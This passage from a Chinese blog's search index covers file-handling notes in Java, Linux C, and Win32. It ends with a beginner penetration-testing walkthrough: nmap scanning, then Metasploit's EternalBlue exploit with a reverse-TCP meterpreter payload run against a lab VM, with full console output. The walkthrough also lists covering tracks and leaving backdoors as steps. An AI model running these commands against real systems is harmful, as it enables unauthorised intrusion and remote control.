close();","tags":["C++","文件处理"],"categories":["Language"]},{"title":"Java文件处理","path":"/re4mile/2021/06/07/language/文件处理/Java/language/","content":"Java文件读取1234InputStream f = new FileInputStream(&quot;C:/java/hello&quot;);或者File f = new File(&quot;C:/java/hello&quot;);InputStream in = new FileInputStream(f); 创建了InputStream对象，就可以使用下面的方法来读取流或者进行其他的流操作。 public void close() throws IOException{} 类似于fclose。抛出IOException异常。 protected void finalize()throws IOException {} 这个方法清除与该文件的连接。 确保在不再引用文件输入流时调用其 close 方法。抛出IOException异常。 方法及描述 public int read(int r)throws IOException{} 这个方法从 InputStream 对象读取指定字节的数据。返回为整数值。返回下一字节数据，如果已经到结尾则返回-1。 public int read(byte[] r) throws IOException{} 这个方法从输入流读取r.length长度的字节。返回读取的字节数。如果是文件结尾则返回-1。 public int available() throws IOException{} 返回下一次对此输入流调用的方法可以不受阻塞地从此输入流读取的字节数。返回一个整数值。 创建&amp;写入如果该流在打开文件进行输出前，目标文件不存在，那么该流会创建该文件。 123456OutputStream f = new FileOutputStream(&quot;C:/java/hello&quot;)或者File f = new File(&quot;C:/java/hello&quot;);OutputStream fOut = new FileOutputStream(f); 建OutputStream 对象完成后，就可以使用下面的方法来写入流或者进行其他的流操作。 序号 方法及描述 3 public void write(int w)throws IOException{} 这个方法把指定的字节写到输出流中。 4 public void write(byte[] w) 把指定数组中w.length长度的字节写到OutputStream中。 除了OutputStream外，还有一些其他的输出流，更多的细节参考下面链接： 目录 **mkdir( )**方法创建一个文件夹，成功则返回true，失败则返回false。失败表明File对象指定的路径已经存在，或者由于整个路径还不存在，该文件夹不能被创建。 **mkdirs()**方法创建一个文件夹和它的所有父文件夹。 12345678910import java.io.File;public class main &#123; public static void main(String[] args) &#123; String dirname = &quot;D:/tmp/user/java/bin&quot;; File d = new File(dirname); d.mkdirs(); &#125;&#125; 读取目录 123456789101112131415161718192021222324252627import java.io.File;public class main&#123; public static void main(String args[]) &#123; String s[]=null; int i=0; File f =null; f=new File(&quot;d:/vm&quot;);//路径是一个存在的 if (f.isDirectory()) &#123; s = f.list(); for ( i = 0; i &lt; s.length; i++) &#123; f = new File(&quot;d:/vm/&quot; + s[i]); if (f.isDirectory()) System.out.println(s[i] + &quot; 是一个目录&quot;); else System.out.println(s[i] + &quot; 是一个文件&quot;); &#125; &#125; else System.out.println(&quot;d:/vm不是一个目录&quot;); &#125;&#125; 列出目录下的文件和文件夹 123456789101112131415161718192021222324import java.io.*;public class Ep implements FilenameFilter&#123; public static void main(String[] args) &#123; new Ep().fileShow(); &#125; @Override public boolean accept(File f, String name) &#123; return name.endsWith(&quot;.java&quot;);//返回当前目录下以.java结尾的文件 &#125; public void fileShow() &#123; File f=new File(&quot;F:\\\\0xC0de\\\\C\\\\2010\\\\C1&quot;); String []filename=f.list(); for(int i=0;i&lt;filename.length;i++) System.out.println(filename[i]); &#125;&#125; 删除目录或者文件 删除文件可以使用 java.io.File.delete() 方法。 以下代码会删除目录 **&#x2F;tmp&#x2F;java&#x2F;**，需要注意的是当删除某一目录时，必须保证该目录下没有其他文件才能正确删除，否则将删除失败。 123456789101112131415161718192021222324252627import java.io.File;public class main&#123; public static void main(String[] args) &#123; // 这里修改为自己的测试目录 File fp = new File(&quot;e:/ShareIsHappy&quot;); rDelete(fp); &#125; // 删除文件及目录 public static void rDelete(File fp) &#123; File[] files = fp.listFiles(); if (files != null) &#123; for (File f : files) &#123; if (f.isDirectory()) rDelete(f);//是目录,就进入目录,然后子文件 else f.delete();//是目录为空,就删除空目录 &#125; &#125; fp.delete();//删除根目录 &#125;&#125; eg二进制写入和读取 1234567891011121314151617181920212223242526272829303132import java.io.*;public class main &#123; public static void main(String[] args) &#123; int x=0; int size=0; OutputStream fpW=null; InputStream fpR=null; byte bWrite[] = &#123; 0x31,0x32,0x33,0x34,0x35 &#125;; try &#123; fpW = new FileOutputStream(&quot;test.txt&quot;); for ( x = 0; x &lt; bWrite.length; x++) fpW.write(bWrite[x]); // writes the bytes fpW.close(); fpR = new FileInputStream(&quot;test.txt&quot;); size = fpR.available(); for (x = 0; x&lt; size; x++) System.out.print((char) fpR.read() + &quot; &quot;); fpR.close(); &#125; catch (IOException e) &#123; System.out.print(&quot;Exception&quot;); &#125; &#125;&#125; 文本写入和读取 12345678910111213141516171819202122232425262728293031323334353637import java.io.*;public class main&#123; public static void main(String[] args) throws IOException &#123; File f =null; FileOutputStream fpW =null; OutputStreamWriter writer=null; FileInputStream fpR =null; InputStreamReader reader = null; StringBuffer sb = null; f=new File(&quot;a.txt&quot;); fpW=new FileOutputStream(f); writer = new OutputStreamWriter(fpW, &quot;UTF-8&quot;);//默认为操作系统默认编码,windows上是gbk writer.append(&quot;邓渠香&quot;); writer.append(&quot;\\r &quot;); writer.append(&quot;dqx&quot;); writer.close(); fpW.close(); fpR = new FileInputStream(f); reader = new InputStreamReader(fpR, &quot;UTF-8&quot;); sb = new StringBuffer(); while (reader.ready()) sb.append((char) reader.read()); reader.close(); fpR.close(); System.out.println(sb.toString()); &#125;&#125; 123456789101112131415161718192021222324252627import java.io.File;import java.io.IOException;/** * @author : msb-zhaoss */public class main&#123; //这是一个main方法，是程序的入口： public static void main(String[] args) throws IOException &#123; //将文件封装为一个File类的对象： File f = new File(&quot;F:/A/B/C/dqx.txt&quot;); System.out.println(&quot;文件是否可读：&quot;+f.canRead()); System.out.println(&quot;文件是否可写：&quot;+f.canWrite()); System.out.println(&quot;文件的名字：&quot;+f.getName()); System.out.println(&quot;上级目录：&quot;+f.getParent()); System.out.println(&quot;是否是一个目录：&quot;+f.isDirectory()); System.out.println(&quot;是否是一个文件：&quot;+f.isFile()); System.out.println(&quot;是否隐藏：&quot;+f.isHidden()); System.out.println(&quot;文件的大小：&quot;+f.length()); System.out.println(&quot;是否存在：&quot;+f.exists()); System.out.println(&quot;绝对路径：&quot;+f.getAbsolutePath()); System.out.println(&quot;相对路径：&quot;+f.getPath()); System.out.println(&quot;toString:&quot;+f.toString()); &#125;&#125;","tags":["文件处理","Java"],"categories":["Language"]},{"title":"LinuxC文件处理","path":"/re4mile/2021/06/07/language/文件处理/Linux/language/","content":"文件和IO123#define STDIN_FILENO 0#define STDOUT_FILENO 1#define STDERR_FILENO 2 导入汇编 下面是调用中断来printf 123456789101112131415161718192021.section .data\tmsg:\t.ascii &quot;Hello, world! &quot; len = . - msg .section .text.globl _start_start: movl $len,%edx movl $msg,%ecx movl $1,%ebx movl $4,%eax int $0x80 movl $0,%ebx movl $1,%eax int $0x80 在调write系统调用时 eax\t寄存器保存着write的系统调用号4 ebx、ecx、edx寄存器分别保存着write系统调用需要的三个参数 如果用C语言 123456789#include &lt;unistd.h&gt;#define len 14char msg[14] = &quot;Hello, world! &quot;;int main(void)&#123;\twrite(1, msg, len);\t_exit(0);&#125; 是等价的 notn I&#x2F;O库函数底层原理fopen&#x2F;fgetc&#x2F;fputs&#x2F;fclose用到了缓冲区,在用户层 write&#x2F;read&#x2F;close没有用到缓冲区,每次读写都要进内核,在底层 ,慢很多, fopen(3) 调用open(2)打开指定的文件，返回这个FILE结构体的地址。其中包含该文件的描述符(就是一个int类型的编号）、I&#x2F;O缓冲区和当前读写位置等信息， fgetc(3) 通过传入的FILE *参数找到该文件的描述符、I&#x2F;O缓冲区和当前读写位置， 判断能否从I&#x2F;O缓冲区中读到下一个字符，如果能读到就直接返回该字符， 否则调用read(2)，把文件描述符传进去，让内核读取该文件的数据到I&#x2F;O缓冲区，然后返回下一个字符。 注意，对于C标准I&#x2F;O库来说，打开的文件由FILE *指针标识， 而对于内核来说，打开的文件由文件描述符标识，文件描述符从open系统调用获得， 在使用read、write、close系统调用时都需要传文件描述符 fputc(3) 判断该文件的I&#x2F;O缓冲区是否有空间再存放一个字符， 如果有空间则直接保存在I&#x2F;O缓冲区中并返回 如果I&#x2F;O缓冲区已满就调用write(2)，让内核把I&#x2F;O缓冲区的内容写回文件 fclose(3) 如果I&#x2F;O缓冲区中还有数据没写回文件，就调用write(2)写回文件，然后调用close(2)关闭文件， 释放FILE结构体和I&#x2F;O缓冲区。 对于上面,我有一个问题,最后的I&#x2F;O缓冲区会不会写入内核?也就是缓冲区没有满的情况下? 答案:认真看书,你会发现,fclose的解释 fclose: 如果I&#x2F;O缓冲区中还有数据没写回文件，就调用write(2)写回文件，然后调用close(2)关闭文件， 释放FILE结构体和I&#x2F;O缓冲区 所以,如果你不调用fclose或者close,你的数据会一直留在缓冲区,不会写入文件 浅谈 非缓冲区函数和缓冲区文件处理函数 用Unbuffered I&#x2F;O函数每次读写都要进内核， 调一个系统调用比调一个用户空间的函数要慢很多， 所以在用户空间开辟I&#x2F;O缓冲区还是必要的， 用C标准I&#x2F;O库函数就比较方便，省去了自己管理I&#x2F;O缓冲区的麻烦。 用C标准I&#x2F;O库函数要时刻注意I&#x2F;O缓冲区和实际文件有可能不一致， 在必要时需调用fflush(3)。fllush可以把数据写入内核 123456789101112#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(void)&#123;\tFILE* fp=NULL;\tfp=fopen(&quot;e:/q.txt&quot;,&quot;w+&quot;);\tif(fp==NULL) perror(&quot;Wrong&quot;);\tfputs(&quot;HelloWorld&quot;,fp); return 0;&#125;//看上去,我们的数据不会写入文件,其实还是写进去了 关于我们为什么要fclose 我们知道fclose(FILE *)可以关闭文件流,但是我们偶尔也会发现似乎不加也没有什么问题.那我们还加他干嘛,那不浪费感情么(开玩笑,别当真,怕被打) 一.清空相关的缓冲区 以写文件为例,程序会先将文本信息存入缓冲区中,然后根据缓冲区刷新指令或者等缓冲区满了以后才向文件写入,那么我们如果不使用fclose()关闭流,就有可能有部分文本信息在缓冲区中没有写入到文本文件中,从而导致文本信息缺失.但是这东西看运气. 二.释放内存 我们知道,如果我们不手动关闭这个流,系统会维持打开的状态,维持当然需要消耗一定的内存资源,本着苍蝇再小也是块肉的原则当然是要把它关掉了,其实如果有很多流在使用后没有关闭,这部分内存资源也是十分可观的. [ ](https://blog.csdn.net/qq_32792307/article/details/112686052) 文件描述符号 每个进程在PCB（Process Control Block）中都保存着一份文件描述符表， 文件描述符就是这个表的索引，每个表项都有一个指向已打开文件的指针，现在我们明确一下： 已打开的文件在内核中用file结构体表示，文件描述符表中的指针指向file结构体 那个文件指针指向了/home/akaedu/foo.txt 已打开的文件在内核中用什么结构体表示?这里暂且不提 用户程序不能直接访问内核中的文件描述符表，而只能使用文件描述符表的索引（即0、1、2、3这些数字）， 这些索引就称为文件描述符, 这些索引是整形int,不同的索引对应了不同的文件指针? 当调用open打开一个文件或创建一个新文件时，内核分配一个文件描述符(一个int索引),并返回给用户程序， 该文件描述符表项中的指针指向新打开的文件。 当读写文件时，用户程序把文件描述符传给read或write， 内核根据文件描述符index找到相应的表项，再通过表项中的指针找到相应的文件 open&#x2F;closeopen函数 open函数可以打开或创建一个文件 12345#include &lt;sys/types.h&gt;#include &lt;sys/stat.h&gt;#include &lt;fcntl.h&gt;int open(const char *pathname, int flags);int open(const char *pathname, int flags, mode_t mode); 参数1 pathname 文件名 参数2 flags参数有一系列常数值可供选择，可以同时选择多个常数用按位或运算符连接起来 必选项 123O_RDONLY //只读模式O_WRONLY //只写模式O_RDWR //读写模式 可选项 123456O_APPEND //每次写操作都写入文件的末尾O_CREAT //如果指定文件不存在，则创建这个文件O_EXCL //如果要创建的文件已存在，则返回-1，并且修改errno的值O_TRUNC //如果文件存在，并且以只写/读写方式打开，则清空文件全部内容(即将其长度截短为0)O_NOCTTY //如果路径名指向终端设备，不要把这个设备用作控制终端。O_NONBLOCK //如果路径名指向FIFO/块文件/字符文件，则把文件的打开和后继I/O 参数3 参数mode指定文件权限 可以用S_IRUSR、S_IWUSR等宏定义按位或起来表示 也可以是八进制数表示，比如0644表示-rw-r–r– 1open(&quot;somefile&quot;, O_WRONLY|O_CREAT, 0664) 返回值： 成功返回新分配的文件描述符，出错返回-1并设置errno close函数 123#include &lt;unistd.h&gt;int close(int fd);返回值：成功返回0，出错返回-1并设置errno 书上有一些关于mod和flag的练习,第二次做一下 read&#x2F;write和fgets和fputs很像 read函数从打开的设备或文件中读取数据 read 1234#include &lt;unistd.h&gt;ssize_t read(int fd, void *buf, size_t count);返回值：成功返回读取的字节数，出错返回-1并设置errno，如果在调read之前已到达文件末尾，则这次read返回0 在C标准库中分别用FILE *指针stdin、stdout和stderr表示。 这三个文件的描述符分别是0、1、2，保存在相应的FILE结构体中。 头文件unistd.h中有如下的宏定义来表示这三个文件描述符 123#define STDIN_FILENO 0#define STDOUT_FILENO 1#define STDERR_FILENO 2 参数 fd 就是那个0&#x2F;1&#x2F;2 参数 buf 接受数据的指针 参数 count 打算读取的字节数 参数count是请求读取的字节数，读上来的数据保存在缓冲区buf中，同时文件的当前读写位置向后移。 注意这个读写位置和使用C标准I&#x2F;O库时的读写位置有可能不同，这个读写位置是记在内核中的， 而使用C标准I&#x2F;O库时的读写位置是用户空间I&#x2F;O缓冲区中的位置。 比如用fgetc读一个字节，fgetc有可能从内核中预读1024个字节到I&#x2F;O缓冲区中，再返回第一个字节，这时 该文件在内核中记录的读写位置是1024，而在FILE结构体中记录的读写位置是1。注意返回值类型是ssize_t， 表示有符号的size_t，这样既可以返回正的字节数、0（表示到达文件末尾）也可以返回负值-1（表示出错）。read函数返回时，返回值说明了buf中前多少个字节是刚读上来的。 不是在内核中读取的字节数 有些情况下，实际读到的字节数（返回值）会小于请求读的字节数count，例如 1). 读常规文件时，在读到count个字节之前已到达文件末尾。 2). 从终端设备读，通常以行为单位，读到换行符就返回了。 3). 从网络读，根据不同的传输层协议和内核缓存机制，返回值可能小于请求的字节数， 后面socket编程部分会详细讲解 读取和阻塞问题 读常规文件通常是不会阻塞的，不管读多少字节，read一定会在有限的时间内返回 如果网络上没有接收到数据包，调用read从网络读就会阻塞，至于会阻塞多长时间也是不确定的， 如果一直没有数据到达就一直阻塞在那里。 write write函数向打开的设备或文件中写数据 123#include &lt;unistd.h&gt;ssize_t write(int fd, const void *buf, size_t count);返回值：成功返回写入的字节数，出错返回-1并设置errno 写常规文件时，write的返回值通常等于请求写的字节数count，而向终端设备或网络写则不一定 同样，写常规文件是不会阻塞的，而向终端设备或网络写则不一定 12345678910111213141516#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;int main(void)&#123;\tchar buf[10];\tint n;\tn = read(STDIN_FILENO, buf, 5);\tif (n &lt; 0) &#123; perror(&quot;read STDIN_FILENO&quot;); exit(1);\t&#125;\twrite(STDOUT_FILENO, buf, n);\treturn 0;&#125; 可以看到,它只读取5个字符,多的字符,会留在终端设备 比如输入12345pwd回车 于是12345被就收.pwd回车留在了stdin 读取完毕后,pwd回车被执行 1234C$ ./q.elf12345pwd12345dqx@dqx:~/桌面/C$ pwd/home/dqx/桌面/C 第一次执行q.elf的结果很正常，而第二次执行的过程有点特殊，现在分析一下： Shell进程fork一个q.elf进程，q.elf进程开始执行，而Shell进程睡眠等待q.elf进程退出。 q.elf调用read时睡眠等待，直到终端设备输入了换行符才从read返回，read只读走10个 字符，剩下的字符仍然保存在内核的终端设备输入缓冲区中。 q.elf进程打印并退出，这时Shell进程恢复运行，Shell继续从终端读取用户输入的命令， 于是读走了终端设备输入缓冲区中剩下的字符pwd和换行符，把它当成一条命令解释执行， 12345678910111213141516171819202122232425262728293031323334#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#define MSG_TRY &quot;try again &quot;int main(void)&#123;\tchar buf[10];\tint fd, n;\tfd = open(&quot;/dev/tty&quot;, O_RDONLY|O_NONBLOCK);//不会阻塞\tif(fd&lt;0) &#123; perror(&quot;open /dev/tty&quot;); exit(1);\t&#125;tryagain:\tn = read(fd, buf, 10);\tif (n &lt; 0) &#123; if (errno == EAGAIN) &#123; sleep(1); write(STDOUT_FILENO, MSG_TRY,strlen(MSG_TRY)); goto tryagain; &#125; perror(&quot;read /dev/tty&quot;); exit(1);\t&#125;\twrite(STDOUT_FILENO, buf, n);\tclose(fd);\treturn 0;&#125; 虽然不是阻塞,但是也只是跳过了阻塞,一直输出tryagain 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#define MSG_TRY &quot;try again &quot;#define MSG_TIMEOUT &quot;timeout &quot;int main(void)&#123;\tchar buf[10];\tint fd, n, i;\tfd = open(&quot;/dev/tty&quot;, O_RDONLY|O_NONBLOCK);//不是阻塞\tif(fd&lt;0) &#123; perror(&quot;open /dev/tty&quot;); exit(1);\t&#125;\tfor(i=0; i&lt;5; i++) //等待一定的时间,等不到就算了\t&#123; n = read(fd, buf, 10); if(n&gt;=0)//成功读取到一些字符串 break; if(errno!=EAGAIN) &#123; perror(&quot;read wrong&quot;); exit(1); &#125; sleep(1); write(STDOUT_FILENO, MSG_TRY,strlen(MSG_TRY));\t&#125;\tif(i==5) write(STDOUT_FILENO, MSG_TIMEOUT,strlen(MSG_TIMEOUT));\telse write(STDOUT_FILENO, buf, n);\tclose(fd);\treturn 0;&#125; lseeklseek和标准I&#x2F;O库的fseek函数类似，可以移动当前读写位置（或者叫偏移量) 123#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;off_t lseek(int fd, off_t offset, int whence); 参数offset和whence的含义和fseek函数完全相同。只不过第一个参数换成了文件描述符。 和fseek一样，偏移量允许超过文件末尾，这种情况下对该文件的下一次写操作将延长文件， 中间空洞的部分读出来都是0 lseek成功时返回当前偏移量 , 失败时返回-1 12off_t currpos;currpos = lseek(fd, 0, SEEK_CUR); 参数 offset 的含义取决于参数 whence： 1231. 如果 whence 是 SEEK_SET，文件偏移量将被设置为 offset.2. 如果 whence 是 SEEK_CUR，文件偏移量将被设置为 当前位置 加上 offset.3. 如果 whence 是 SEEK_END，文件偏移量将被设置为文件长度加上offset. 其它fcntl用fcntl函数改变一个已打开的文件的属性，可以重新设置读、写、追加、非阻塞等标志 （这些标志称为File StatusFlag），而不必重新open文件 12345#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;int fcntl(int fd, int cmd);int fcntl(int fd, int cmd, long arg);int fcntl(int fd, int cmd, struct flock *lock); 可变参数的类型和个数取决于前面的cmd参数 File StatusFlag里面有很多的东西 1234567891011121314151617181920212223242526272829303132333435#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#define MSG_TRY &quot;try again &quot;int main(void)&#123;\tchar buf[10];\tint n;\tint flags;\tflags = fcntl(STDIN_FILENO, F_GETFL);//获取以及有的属性\tflags |= O_NONBLOCK;\tif (fcntl(STDIN_FILENO, F_SETFL, flags) == -1)//设置属性\t&#123; perror(&quot;fcntl&quot;); exit(1);\t&#125;\ttryagain:\tn = read(STDIN_FILENO, buf, 5);\tif (n &lt; 0) &#123; if (errno == EAGAIN) &#123; sleep(1); write(STDOUT_FILENO, MSG_TRY,strlen(MSG_TRY)); goto tryagain; &#125; perror(&quot;read stdin&quot;); exit(1);\t&#125;\twrite(STDOUT_FILENO, buf, n);\treturn 0;&#125; 说一下,上面那个代码的 它不会阻塞read,也就是它不会给你时间输入,虽然你可以输入,但是你在那个时间片段,很难输入5个字符 所以他会一直循环 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;sys/types.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char *argv[])&#123;\tint val;\tif (argc != 2) &#123; fputs(&quot;usage: a.out &lt;descriptor#&gt; &quot;, stderr); exit(1);\t&#125;\tif ((val = fcntl(atoi(argv[1]), F_GETFL)) &lt; 0) &#123; printf(&quot;fcntl error for fd %d &quot;, atoi(argv[1])); exit(1);\t&#125;\tswitch(val &amp; O_ACCMODE) &#123; case O_RDONLY: printf(&quot;read only&quot;); break; case O_WRONLY: printf(&quot;write only&quot;); break; case O_RDWR: printf(&quot;read write&quot;); break; default: fputs(&quot;invalid access mode &quot;, stderr); exit(1);\t&#125;\tif (val &amp; O_APPEND) printf(&quot;, append&quot;);\tif (val &amp; O_NONBLOCK) printf(&quot;, nonblocking&quot;);\tputchar(&#x27; &#x27;);\treturn 0;&#125; ioctl感觉,这里没啥要讲的东西 ioctl用于向设备发控制和配置命令 12#include &lt;sys/ioctl.h&gt;int ioctl(int d, int request, ...); d是某个设备的文件描述符。request是ioctl的命令，可变参数取决于request， 通常是一个指向变量或结构体的指针 若出错则返回-1， 若成功则返回其他值， 返回值也是取决于request 读取控制台窗口大小 1234567891011121314151617#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/ioctl.h&gt;int main(void)&#123;\tstruct winsize size;\tif (isatty(STDOUT_FILENO) == 0) exit(1);\tif(ioctl(STDOUT_FILENO, TIOCGWINSZ, &amp;size)&lt;0) &#123; perror(&quot;ioctl TIOCGWINSZ error&quot;); exit(1);\t&#125;\tprintf(&quot;%d rows, %d columns &quot;, size.ws_row, size.ws_col);\treturn 0;&#125; mmap就是把磁盘文件内存映射 mmap可以把磁盘文件的一部分直接映射到内存，这样文件中的位置直接就有对应的内存地址， 感觉就像MapView的那个win32的API 对文件的读写可以直接用指针来做而不需要read&#x2F;write函数。 1234#include &lt;sys/mman.h&gt;void *mmap(void *addr, size_t len, int prot, int flag, int filedes, off_t off);void *mmap(void *加载地址, size_t 加载长度, int 内存属性, int 多进程访问属性, int 文件描述符, off_t 从文件的什么位置开始映射);int munmap(void *addr, size_t len); 如果addr参数为NULL，内核会选择合适的地址建立映射。 如果addr不是NULL，内核会选择addr之上的某个合适的地址开始映射。 建立映射后，真正的映射首地址通过返回值可以得到。 len参数是需要映射的那一部分文件的长度。 off参数是从文件的什么位置开始映射，必须是页大小的整数倍（在32位体系统结构上通常是4K）。 filedes是代表该文件的描述符 prot参数有四种取值： PROT_EXEC 表示映射的这一段可执行，例如映射共享库 PROT_READ 表示映射的这一段可读 PROT_WRITE 表示映射的这一段可写 PROT_NONE 表示映射的这一段不可访问 flag参数有很多种取值，这里只讲两种，其它取值可查看mmap(2) MAP_SHARED 多个进程对同一个文件的映射是共享的，一个进程对映射的内存做了修改，另一个进程也会看到这种变化。 MAP_PRIVATE 多个进程对同一个文件的映射不是共享的，一个进程对映射的内存做了修改， 另一个进程并不会看到这种变化，也不会真的写到文件中去。 如果mmap成功则返回映射首地址， 如果出错则返回常数MAP_FAILED。 当进程终止时，该进程的映射内存会自动解除，也可以调用munmap解除映射。 munmap成功返回0，出错返回-1。 1234567891011121314151617181920212223242526#include &lt;stdlib.h&gt;#include &lt;sys/mman.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int main(void)&#123;\tint *p;\tint fd = open(&quot;hello&quot;, O_RDWR);\tif (fd &lt; 0) &#123; perror(&quot;open hello&quot;); exit(1);\t&#125;\tp = mmap(NULL, 6, PROT_WRITE, MAP_SHARED, fd, 0);\tif (p == MAP_FAILED) &#123; perror(&quot;mmap&quot;); exit(1);\t&#125;\tclose(fd);\tp[0] = 0x30313233;\tmunmap(p, 6);\treturn 0;&#125; hello文件 dqx is a good boy 执行程序后 3210is a good boy 什么???? 小结I&#x2F;O库函数底层原理小节: 主要讲了内核和缓冲区的一个交互过程 文件描述符号小节 简单介绍了一下,进程描述表和文件描述表,进程描述表包含了文件描述表 而文件描述表给用户提供了文件描述符来访问进程的文件描述表,而不是直接提供文件描述表 open&#x2F;close&#x2F;read&#x2F;write&#x2F;lseek小节 简单介绍了一下函数,没有说到底层原理 然后说到了阻塞的问题 fcntl&#x2F;ioctl&#x2F;mmap小节 简单说了一下fcntl,就是修改一些文件描述符的属性,比如阻塞的相关属性 ioctl ..没怎么讲 mmap,可能会用的比较多把,涉及的是内存映射,但是具体怎么用,还不太知道","tags":["C","文件处理"],"categories":["Language"]},{"title":"Python文件处理","path":"/re4mile/2021/06/07/language/文件处理/Python/language/","content":"Python","tags":["Python","文件处理"],"categories":["Language"]},{"title":"Win32文件处理","path":"/re4mile/2021/06/07/language/文件处理/win32/language/","content":"Win32CreateFile12345678910 CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL) // filename 要创建文件的名字 // GENERIC_WRITE 覆盖重写 hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);//创建了一个文件if (hFile == INVALID_HANDLE_VALUE)&#123; printf(&quot;CreateFile error. &quot;); return 0;&#125; WriteFile将数据写入指定的文件或输入&#x2F;输出 (I&#x2F;O) 设备。 1234567BOOL WriteFile( [in] HANDLE hFile, //一个文件的句柄 [in] LPCVOID lpBuffer, //指向将写入文件的 数据缓冲区 [in] DWORD nNumberOfBytesToWrite, //要写入数据的字节数量 [out, optional] LPDWORD lpNumberOfBytesWritten, //实际写入文件的字节数 [in, out, optional] LPOVERLAPPED lpOverlapped); 1234WriteFile(hFile, sz_tmp, strlen(sz_tmp), NULL, NULL);//hFile是CreateFile返回的句柄//sz_tmp是写入的数据的指针//strlen(sz_tmp)写入的长度","tags":["文件处理","win32"],"categories":["Language"]},{"title":"Web渗透尝试入门","path":"/re4mile/2021/06/07/web/渗透测试/初级入门/web/","content":"导语1). 信息收集 nslookup whois 2). 扫描漏洞 namp&#x3D;(ip范围) 端口 80 (ISS,Apache..) 3). 漏洞利用 4). 提权(Shell控制台 &#x2F; 桌面) 5). 毁尸灭迹 6). 留后门 7). 渗透测试报告 8). 解决方案 445win server 1ipconfig kali 1ip addr 然后kali扫描网段 12┌──(root㉿re4mile)-[/home/re4mile/桌面]└─# nmap -sP 192.168.205.0/24 kali扫描指定ip的端口漏洞 12┌──(root㉿re4mile)-[/home/re4mile/桌面]└─# nmap -sV 192.168.205.132 kali 使用工具 msfconsole 12┌──(root㉿re4mile)-[/home/re4mile/桌面]└─# msfconsole 利用扫描脚本smb_ms17_010开始扫描靶机 1msf6 &gt; use auxiliary/scanner/smb/smb_ms17_010 设置靶机IP 12msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhost 192.168.205.132rhost =&gt; 192.168.205.132 开始扫描 1msf6 auxiliary(scanner/smb/smb_ms17_010) &gt; run 扫描结果 1234[+] 192.168.205.132:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)[*] 192.168.205.132:445 - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf6 auxiliary(scanner/smb/smb_ms17_010) &gt; 发现445端口会被攻击 然后使用攻击脚本 , 反弹链接的一个payload，让靶机主动连接KALI 12msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcp 然后设置靶机IP 待连接的IP 开始攻击 123456msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhost 192.168.205.132rhost =&gt; 192.168.205.132 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.205.129lhost =&gt; 192.168.205.129 msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit 攻击结果 12345678910111213141516171819202122232425262728293031[*] Started reverse TCP handler on 192.168.205.129:4444 [*] 192.168.205.132:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 192.168.205.132:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit) [*] 192.168.205.132:445 - Scanned 1 of 1 hosts (100% complete) [+] 192.168.205.132:445 - The target is vulnerable. [*] 192.168.205.132:445 - Connecting to target for exploitation.[+] 192.168.205.132:445 - Connection established for exploitation.[+] 192.168.205.132:445 - Target OS selected valid for OS indicated by SMB reply[*] 192.168.205.132:445 - CORE raw buffer dump (51 bytes)[*] 192.168.205.132:445 - 0x00000000 57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32 Windows Server 2[*] 192.168.205.132:445 - 0x00000010 30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20 008 R2 Standard [*] 192.168.205.132:445 - 0x00000020 37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63 7601 Service Pac[*] 192.168.205.132:445 - 0x00000030 6b 20 31 k 1 [+] 192.168.205.132:445 - Target arch selected valid for arch indicated by DCE/RPC reply[*] 192.168.205.132:445 - Trying exploit with 12 Groom Allocations.[*] 192.168.205.132:445 - Sending all but last fragment of exploit packet[*] 192.168.205.132:445 - Starting non-paged pool grooming[+] 192.168.205.132:445 - Sending SMBv2 buffers[+] 192.168.205.132:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.[*] 192.168.205.132:445 - Sending final SMBv2 buffers.[*] 192.168.205.132:445 - Sending last fragment of exploit packet![*] 192.168.205.132:445 - Receiving response from exploit packet[+] 192.168.205.132:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)![*] 192.168.205.132:445 - Sending egg to corrupted connection.[*] 192.168.205.132:445 - Triggering free of corrupted buffer.[*] Sending stage (200774 bytes) to 192.168.205.132[*] Meterpreter session 1 opened (192.168.205.129:4444 -&gt; 192.168.205.132:49159) at 2022-12-28 14:38:37 +0800[+] 192.168.205.132:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=[+] 192.168.205.132:445 - 